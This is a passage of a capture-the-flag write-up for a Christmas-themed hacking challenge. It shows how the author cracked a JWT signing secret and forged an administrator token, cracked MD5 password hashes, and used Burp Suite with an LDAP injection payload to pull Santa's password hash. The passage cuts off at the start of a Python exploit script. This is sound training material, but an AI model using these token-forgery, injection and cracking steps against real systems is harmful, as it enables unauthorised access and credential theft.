                                                                                  <td style="width: 428.6pt; border: solid windowtext 1.0pt; border-top: none; mso-border-top-alt: solid windowtext .5pt; mso-border-alt: solid windowtext .5pt; padding: 0in 5.4pt 0in 5.4pt;" valign="top" width="429">
                                                                                  <p class="MsoFooter" style="margin-left: .5in;"><span style="font-size: 12.0pt; color: #84d3e4; mso-themecolor: accent1; mso-themetint: 153; mso-fareast-language: ZH-CN;"> </span></p>
                                                                                  <p class="MsoFooter" style="margin-left: .5in;"><span style="font-size: 12.0pt; color: #84d3e4; mso-themecolor: accent1; mso-themetint: 153; mso-fareast-language: ZH-CN;">HMACSHA256(</span></p>
                                                                                  <p class="MsoFooter" style="margin-left: .5in;"><span style="font-size: 12.0pt; color: #84d3e4; mso-themecolor: accent1; mso-themetint: 153; mso-fareast-language: ZH-CN;"><span style="mso-spacerun: yes;">  </span>base64UrlEncode(header) +<br />"." +</span></p>
                                                                                  <p class="MsoFooter" style="margin-left: .5in;"><span style="font-size: 12.0pt; color: #84d3e4; mso-themecolor: accent1; mso-themetint: 153; mso-fareast-language: ZH-CN;"><span style="mso-spacerun: yes;">  </span>base64UrlEncode(payload),</span></p>
                                                                                  <p class="MsoFooter" style="margin-left: .5in;"><span style="font-size: 12.0pt; color: #84d3e4; mso-themecolor: accent1; mso-themetint: 153; mso-fareast-language: ZH-CN;">) secret base64 encoded</span></p>
                                                                                  <p class="MsoFooter" style="margin-left: .5in;"><span style="font-size: 12.0pt; color: #84d3e4; mso-themecolor: accent1; mso-themetint: 153; mso-fareast-language: ZH-CN;"> </span></p>
                                                                                  </td>
                                                                                  </tr>
                                                                                  </tbody>
                                                                                  </table>
                                                                                  <p class="MsoNormal">Ah, it looks like the JWT is expired. I then changed the JWT to expire “2018-08-16 12:00:47.248093+00:00”. With the payload section updated, I then needed to find a way to resign the JWT so the server would accept it as valid. In order to sign the JWT, I’ll need the secret key in use by the server.</p>
                                                                                  <p class="MsoNormal">I spent several hours looking at various JWT tools like, <a href="https://github.com/jmaxxz/jwtbrute">jwtbruke</a>, <a href="https://github.com/lmammino/jwt-cracker">jwt-cracker</a>, <a href="https://github.com/ticarpi/jwt_tool">jwt_tool</a> and even <a href="https://github.com/jpadilla/pyjwt">pyjwt</a>. Needless to say, I had little success using these tools out of the box.</p>
                                                                                  <p class="MsoNormal">What I was able to do relatively easily was use the community version of <a href="https://github.com/magnumripper/JohnTheRipper">John<br />the Ripper</a> against the encoded JWT I originally captured. <span style="mso-spacerun: yes;">   </span></p>
                                                                                  <pre class="MsoFooter" style="margin-left: .5in;"><span class="s1"><span style="font-size: 12.0pt;">[root@kali run]$ cat jwt_fulltoken</span></span><span class="apple-converted-space"><span style="font-size: 12.0pt;"> </span></span>

                                                                                  <span class="s1"><span style="font-size: 12.0pt;">Use the "--show" option to display all of the cracked passwords reliably</span></span>
                                                                                  <span class="s1"><span style="font-size: 12.0pt;">Session completed</span></span></pre>
                                                                                  <p class="MsoNormal">The crack only took approximately 30 seconds to find that<br />Mr. Snowball created the secret key was ‘<i>3lv3s’</i>. Elves – cute. With the<br />secret, I was able to craft (via jwt.io) the updated ‘expires’ field and new<br />signature:</p>
                                                                                  <pre class="MsoNormal" style="margin-left: .5in;"><span class="FooterChar"><span style="font-size: 12.0pt; line-height: 120%;">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE4LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.gr2b8plsmw_JCKbomOUR-E7jLiSMeQ-evyYjcxCPXco</span></span></pre>
                                                                                  <p class="MsoNormal">I then used the developer tools console of my browser to call:</p>
                                                                                  <pre class="MsoNormal" style="margin-left: .5in;"><span class="FooterChar"><span style="font-size: 12.0pt; line-height: 120%;">localStorage.setItem(‘np-auth’,
                                                                                   ‘eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE4LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.gr2b8plsmw_JCKbomOUR-E7jLiSMeQ-evyYjcxCPXco’)</span></span></pre>
                                                                                   <p class="MsoNormal">When I refreshed my browser I was successfully past the login form for EDB.</p>
                                                                                   <p class="MsoNormal">With my new access to the search functionality of EDB I began to look at what I could exploit in this new interface. After playing around with the default interface, I noticed in order to access the “Santa Panel” I needed to be a “Claus”.</p>
                                                                                   <p class="MsoNormal">I quickly regenerated my JWT token and replaced my existing payload:</p>
                                                                                   <pre class="MsoFooter" style="margin-left: .5in;"><span style="font-size: 12.0pt;">{</span>
                                                                                   <span style="font-size: 12.0pt;"><span style="mso-spacerun: yes;">  </span>"dept": "Engineering",</span>
                                                                                   <span style="font-size: 12.0pt;"><span style="mso-spacerun: yes;">  </span>"ou": "elf",</span>
                                                                                   <span style="font-size: 12.0pt;"><span style="mso-spacerun: yes;">  </span>"expires": "2017-08-16 12:00:47.248093+00:00",</span>
                                                                                   <span style="font-size: 12.0pt;"><span style="mso-spacerun: yes;">  </span>"uid": "alabaster.snowball"</span>
                                                                                   <span style="font-size: 12.0pt;">}</span><span style="font-size: 12.0pt;"> </span></pre>
                                                                                   <p class="MsoNormal">to</p>
                                                                                   <pre class="MsoFooter" style="margin-left: .5in;"><span style="font-size: 12.0pt;">{</span>
                                                                                   <span style="font-size: 12.0pt;"><span style="mso-spacerun: yes;">  </span>"dept": "administrators",</span>
                                                                                   <span style="font-size: 12.0pt;"><span style="mso-spacerun: yes;">  </span>"ou": "human",</span>
                                                                                   <span style="font-size: 12.0pt;"><span style="mso-spacerun: yes;">  </span>"expires": "2017-08-16 12:00:47.248093+00:00",</span>
                                                                                   <span style="font-size: 12.0pt;"><span style="mso-spacerun: yes;">  </span>"uid": "santa.claus"</span>
                                                                                   <span style="font-size: 12.0pt;">}</span></pre>
                                                                                   <p class="MsoFooter" style="margin-left: .5in;"><span style="font-size: 12.0pt;"> </span></p>
                                                                                   <p class="MsoNormal">In order to obtain the uid, dept and ou field, I referenced the original LDAP data I queried early in the competition. With the new JWT crafted and loaded into my browser, I refreshed my page again. This time when I tried to access the Santa Panel, it prompted me for a password.</p>
                                                                                   <p class="MsoNormal">At this point, I went back to John the Ripper to crack Santa’s password.</p>
                                                                                   <p class="MsoNormal">I took Santa Claus’s password from my LDAP information,<span style="mso-spacerun: yes;">  </span><i>Y2RhYmViOTZiNTA4ZjI1Zjk3YWIwZjE2MmVhYzVhMDQ=, </i>base64 decoded it and wrote it out to a file. My first run of john against it, detected that it could be several different types, so I decided to see what ‘hash-identifier’ could tell me.</p>
                                                                                   <pre class="MsoFooter" style="margin-left: .5in;"><span style="font-size: 12.0pt; mso-bidi-font-family: Tahoma; mso-bidi-theme-font: minor-latin; color: #c33720; mso-fareast-language: ZH-CN;">root@kali</span><span style="font-size: 12.0pt; mso-bidi-font-family: Tahoma; mso-bidi-theme-font: minor-latin; color: #e4e4e4; mso-fareast-language: ZH-CN;">:</span><span style="font-size: 12.0pt; mso-bidi-font-family: Tahoma; mso-bidi-theme-font: minor-latin; mso-fareast-language: ZH-CN;">~/Documents/code/JohnTheRipper/run</span><span style="font-size: 12.0pt; mso-bidi-font-family: Tahoma; mso-bidi-theme-font: minor-latin; color: #bfbfbf; mso-themecolor: background1; mso-themeshade: 191; mso-fareast-language: ZH-CN;"># hash-identifier </span>

                                                                                     <span lang="DA" style="font-size: 12.0pt; mso-bidi-font-family: Tahoma; mso-bidi-theme-font: minor-latin; color: #bfbfbf; mso-themecolor: background1; mso-themeshade: 191; mso-ansi-language: DA; mso-fareast-language: ZH-CN;">[+]  md5($salt.md5($pass))</span>
                                                                                     <span lang="DA" style="font-size: 12.0pt; mso-bidi-font-family: Tahoma; mso-bidi-theme-font: minor-latin; color: #bfbfbf; mso-themecolor: background1; mso-themeshade: 191; mso-ansi-language: DA; mso-fareast-language: ZH-CN;">[+]  md5($salt.md5($pass))</span>
                                                                                     <span lang="DA" style="font-size: 12.0pt; mso-bidi-font-family: Tahoma; mso-bidi-theme-font: minor-latin; color: #bfbfbf; mso-themecolor: background1; mso-themeshade: 191; mso-ansi-language: DA; mso-fareast-language: ZH-CN;">[+]  md5($salt.md5($pass.$salt))</span>

                                                                                     <span lang="DA" style="font-size: 12.0pt; mso-bidi-font-family: Tahoma; mso-bidi-theme-font: minor-latin; color: #bfbfbf; mso-themecolor: background1; mso-themeshade: 191; mso-ansi-language: DA; mso-fareast-language: ZH-CN;">[+]  md5($salt.md5($salt.$pass))</span>
                                                                                     <span lang="DA" style="font-size: 12.0pt; mso-bidi-font-family: Tahoma; mso-bidi-theme-font: minor-latin; color: #bfbfbf; mso-themecolor: background1; mso-themeshade: 191; mso-ansi-language: DA; mso-fareast-language: ZH-CN;">[+]  md5($salt.md5(md5($pass).$salt))</span>
                                                                                     <span lang="DA" style="font-size: 12.0pt; mso-bidi-font-family: Tahoma; mso-bidi-theme-font: minor-latin; color: #bfbfbf; mso-themecolor: background1; mso-themeshade: 191; mso-ansi-language: DA; mso-fareast-language: ZH-CN;">[+]  md5($username.0.$pass)</span>
                                                                                     <span lang="DA" style="font-size: 12.0pt; mso-bidi-font-family: Tahoma; mso-bidi-theme-font: minor-latin; color: #bfbfbf; mso-themecolor: background1; mso-themeshade: 191; mso-ansi-language: DA; mso-fareast-language: ZH-CN;">[+]  md5($username.LF.$pass)</span>
                                                                                     <span lang="DA" style="font-size: 12.0pt; mso-bidi-font-family: Tahoma; mso-bidi-theme-font: minor-latin; color: #bfbfbf; mso-themecolor: background1; mso-themeshade: 191; mso-ansi-language: DA; mso-fareast-language: ZH-CN;">[+]  md5($username.md5($pass).$salt)</span>
                                                                                     <span lang="DA" style="font-size: 12.0pt; mso-bidi-font-family: Tahoma; mso-bidi-theme-font: minor-latin; color: #bfbfbf; mso-themecolor: background1; mso-themeshade: 191; mso-ansi-language: DA; mso-fareast-language: ZH-CN;">[+]  md5(md5($pass))</span>
                                                                                     <span lang="DA" style="font-size: 12.0pt; mso-bidi-font-family: Tahoma; mso-bidi-theme-font: minor-latin; color: #bfbfbf; mso-themecolor: background1; mso-themeshade: 191; mso-ansi-language: DA; mso-fareast-language: ZH-CN;">[+]  md5(md5($pass).$salt)</span>
                                                                                     <span lang="DA" style="font-size: 12.0pt; mso-bidi-font-family: Tahoma; mso-bidi-theme-font: minor-latin; color: #bfbfbf; mso-themecolor: background1; mso-themeshade: 191; mso-ansi-language: DA; mso-fareast-language: ZH-CN;">[+]  md5(md5($pass).md5($salt))</span>
                                                                                     <span lang="DA" style="font-size: 12.0pt; mso-bidi-font-family: Tahoma; mso-bidi-theme-font: minor-latin; color: #bfbfbf; mso-themecolor: background1; mso-themeshade: 191; mso-ansi-language: DA; mso-fareast-language: ZH-CN;">[+]  md5(md5($salt).$pass)</span>
                                                                                     <span lang="DA" style="font-size: 12.0pt; mso-bidi-font-family: Tahoma; mso-bidi-theme-font: minor-latin; color: #bfbfbf; mso-themecolor: background1; mso-themeshade: 191; mso-ansi-language: DA; mso-fareast-language: ZH-CN;">[+]  md5(md5($salt).md5($pass))</span>
                                                                                     <span lang="DA" style="font-size: 12.0pt; mso-bidi-font-family: Tahoma; mso-bidi-theme-font: minor-latin; color: #bfbfbf; mso-themecolor: background1; mso-themeshade: 191; mso-ansi-language: DA; mso-fareast-language: ZH-CN;">[+]  md5(md5($username.$pass).$salt)</span>
                                                                                     <span style="font-size: 12.0pt; mso-bidi-font-family: Tahoma; mso-bidi-theme-font: minor-latin; color: #bfbfbf; mso-themecolor: background1; mso-themeshade: 191; mso-fareast-language: ZH-CN;">[+] md5(md5(md5($pass)))</span>

                                                                                     <span style="font-size: 12.0pt; mso-bidi-font-family: Tahoma; mso-bidi-theme-font: minor-latin; color: #bfbfbf; mso-themecolor: background1; mso-themeshade: 191; mso-fareast-language: ZH-CN;">[+] md5(sha1($pass))</span>
                                                                                     <span style="font-size: 12.0pt; mso-bidi-font-family: Tahoma; mso-bidi-theme-font: minor-latin; color: #bfbfbf; mso-themecolor: background1; mso-themeshade: 191; mso-fareast-language: ZH-CN;">[+] md5(sha1(md5($pass)))</span>
                                                                                     <span style="font-size: 12.0pt; mso-bidi-font-family: Tahoma; mso-bidi-theme-font: minor-latin; color: #bfbfbf; mso-themecolor: background1; mso-themeshade: 191; mso-fareast-language: ZH-CN;">[+] md5(sha1(md5(sha1($pass))))</span>
                                                                                     <span style="font-size: 12.0pt; mso-bidi-font-family: Tahoma; mso-bidi-theme-font: minor-latin; color: #bfbfbf; mso-themecolor: background1; mso-themeshade: 191; mso-fareast-language: ZH-CN;">[+] md5(strtoupper(md5($pass)))</span><span style="font-size: 12.0pt; mso-bidi-font-family: Tahoma; mso-bidi-theme-font: minor-latin; color: #e4e4e4; mso-fareast-language: ZH-CN;">
                                                                                      -------------------------------------------------------------------------</span></pre>
                                                                                      <p class="MsoFooter" style="margin-left: .5in;"><span style="color: #e4e4e4; mso-fareast-language: ZH-CN;"> </span></p>
                                                                                      <p class="MsoNormal">With a probable match as an MD5 hash, I decided to tell JtR to focus on the Raw-MD5 format. It took only seconds to crack this against a decently sized wordlist – 1iwantacookie.</p>
                                                                                      <p class="MsoNormal">With Santa’s password, I went back to the Santa Panel and entered the password. No dice. Since Santa’s password didn’t work, it was time to recheck my work. Since I originally obtained the password early in the challenge when LDAP was open, I wanted to see if I still had the correct password hash for the account.</p>
                                                                                      <p class="MsoNormal">In order to do this, I decided I would need to trick the EDB application into showing me passwords. I used the Burp Suite to help me with this.</p>
                                                                                      <p class="MsoNormal">I decided to intercept the basic search request and changed the default query of: “<i>profilePath%2Cgn%2Csn%2Cmail</i>” to “<i>userPassword%2Cgn%2Csn%2Cmail</i>”.</p>
                                                                                      <p class="MsoNormal">My efforts were rewarded with the query returning the passwords for my search results. However, the web application only allows you to search for elves and reindeer, not humans. This prevented me from obtaining information about Santa Claus.</p>
                                                                                      <p class="MsoNormal">After poking around in the web interface, I was able to find a code snippet in the HTML file named “html” that really helped me understand the LDAP query.</p>
                                                                                      <pre class="MsoFooter" style="margin-left: .5in;"><span style="font-size: 12.0pt;">//Note: remember to remove comments about backend query before going into north pole production network</span>
                                                                                      <span style="font-size: 12.0pt;">/*</span>
                                                                                      <span style="font-size: 12.0pt;">     isElf = 'elf'</span>
                                                                                      <span style="font-size: 12.0pt;">     if request.form['isElf'] != 'True': </span><span style="font-size: 12.0pt;">isElf = 'reindeer'</span>
                                                                                      <span style="font-size: 12.0pt;"><span style="mso-spacerun: yes;">                </span>attribute_list = [x.encode('UTF8') for x in request.form['attributes'].split(',')]</span>
                                                                                      <span style="font-size: 12.0pt;"><span style="mso-spacerun: yes;">                </span>result = ldap_query('(|(&amp;(gn=*'+request.form['name']+'*)(ou='+isElf+'))(&amp;(sn=*'+request.form['name']+'*)(ou='+isElf+')))', attribute_list)</span>

                                                                                      <span style="font-size: 12.0pt;"><span style="mso-spacerun: yes;">     </span>#request.form is the dictionary containing post params sent by client-side</span>
                                                                                      <span style="font-size: 12.0pt;"><span style="mso-spacerun: yes;">     </span>#We only want to allow query elf/reindeer data</span>
                                                                                      <span style="font-size: 12.0pt;">*/</span></pre>
                                                                                      </div>
                                                                                      <p> </p>
                                                                                      <div class="WordSection1">
                                                                                      <p class="MsoNormal">Even though the sample code in the HTML specifies the variable ‘isElf’ as a string (i.e. reindeer) and specifies the query as ‘ou=’, that’s not what the actual query is. In production, isElf is a Boolean that is passed to the code on the backend.</p>
                                                                                      <p class="MsoNormal">In order to trick the database query to return more than just elf or reindeer data, I headed back to the Burp suite. This time, I executed a Cluster bomb attack and changed both the ‘name’ and ‘attributes’ payload. For the ‘name’ field, I ‘<i>injected ))(department=it)(|(cn=’ and for the ‘attribute’ field I wanted to send ‘userPassword%2Cgn%2Csn%2Cmail</i>’.</p>
                                                                                      <p class="MsoNormal">What this will accomplish is when the backend processing code substitutes the ‘name’ variable’, it should also ‘AND’ the ‘department=it’ into the query.</p>
                                                                                      <p class="MsoNormal">When the attack was executed, I indeed saw Santa’s password in the HTTP response:</p>
                                                                                      <pre class="MsoFooter" style="margin-left: .5in;"><span style="font-size: 12.0pt;">{"gn":["Santa"],"mail":["santa.claus@northpolechristmastown.com"],"sn":["Claus"],"userPassword":["d8b4c05a35b0513f302a85c409b4aab3"]}</span><span style="font-size: 12.0pt;"> </span></pre>
                                                                                      <p class="MsoNormal">Now, when looking at the userPassword field I just got and compared to what I originally found early in the challenge, it is indeed different.</p>
                                                                                      <p class="MsoNormal">At this point, I cracked the new hash for Santa.</p>
                                                                                      <pre class="MsoFooter" style="margin-left: .5in;"><b><span style="font-size: 12.0pt; color: #c33720; mso-fareast-language: ZH-CN;">root@kali</span></b><span style="font-size: 12.0pt; mso-fareast-language: ZH-CN;">:</span><b><span style="font-size: 12.0pt; color: #5230e1; mso-fareast-language: ZH-CN;">~/Documents/code/JohnTheRipper/run</span></b><span style="font-size: 12.0pt; mso-fareast-language: ZH-CN;"># echo "d8b4c05a35b0513f302a85c409b4aab3" &gt; santapw </span>

                                                                                      <p class="MsoNormal">The cracked password is ‘001cookielips001’! With that password, I access the “Santa Panel” once again and the letter was displayed.</p>

                                                                                       <span style="font-size: 12.0pt; color: #a6a6a6; mso-themecolor: background1; mso-themeshade: 166; mso-fareast-language: ZH-CN;">import requests</span>

                                                                                       <span style="font-size: 12.0pt; color: #a6a6a6; mso-themecolor: background1; mso-themeshade: 166; mso-fareast-language: ZH-CN;">import sys</span>

                                                                                       <span style="font-size: 12.0pt; color: #a6a6a6; mso-themecolor: background1; mso-themeshade: 166; mso-fareast-language: ZH-CN;"> </span>

                                                                                       <span style="font-size: 12.0pt; color: #a6a6a6; mso-themecolor: background1; mso-themeshade: 166; mso-fareast-language: ZH-CN;">def exploration(command):</span>
